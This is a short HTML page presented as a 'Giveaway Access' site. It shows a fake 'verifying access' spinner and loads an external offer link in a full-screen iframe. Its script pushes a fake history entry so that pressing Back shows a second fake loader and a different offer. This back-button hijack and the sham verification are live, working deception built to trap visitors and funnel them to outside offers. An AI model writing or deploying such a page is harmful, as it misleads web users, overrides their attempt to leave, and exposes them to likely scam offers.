<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Giveaway Access</title>
  <style>
    body, html {
      margin: 0; padding: 0; height: 100%;
      font-family: sans-serif;
    }
    .center {
      position: absolute;
      top: 0; left: 0;
      width: 100vw; height: 100vh;
      display: flex; flex-direction: column;
      align-items: center; justify-content: center;
      background: white; z-index: 10;
    }
    .spinner {
      border: 6px solid #f3f3f3;
      border-top: 6px solid #3498db;
      border-radius: 50%;
      width: 50px; height: 50px;
      animation: spin 1s linear infinite;
      margin-top: 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    iframe {
      width: 100vw; height: 100vh;
      border: none;
    }
  </style>
</head>
<body>

<div id="loader" class="center">
  <h2 id="loaderText">Verifying access, please wait...</h2>
  <div class="spinner"></div>
</div>

<iframe id="offerFrame" src=""></iframe>

<script>
  const iframe = document.getElementById('offerFrame');
  const loader = document.getElementById('loader');
  const loaderText = document.getElementById('loaderText');

  const params = new URLSearchParams(window.location.search);
  const step = params.get("step");

  if (step === "2") {
    // User hit back, show second loader and offer
    loader.style.display = "flex";
    loaderText.innerText = "Looking for another giveaway, please wait...";
    setTimeout(() => {
      loader.style.display = "none";
      iframe.src = "https://wy121.com/link?z=8949381"; // second offer
    }, 4000);
  } else {
    // First load — show first offer, and push step=2 to history
    loader.style.display = "none";
    iframe.src = "https://wy121.com/link?z=8810180"; // first offer
    history.pushState({}, '', '?step=2');
  }
</script>

</body>
</html>
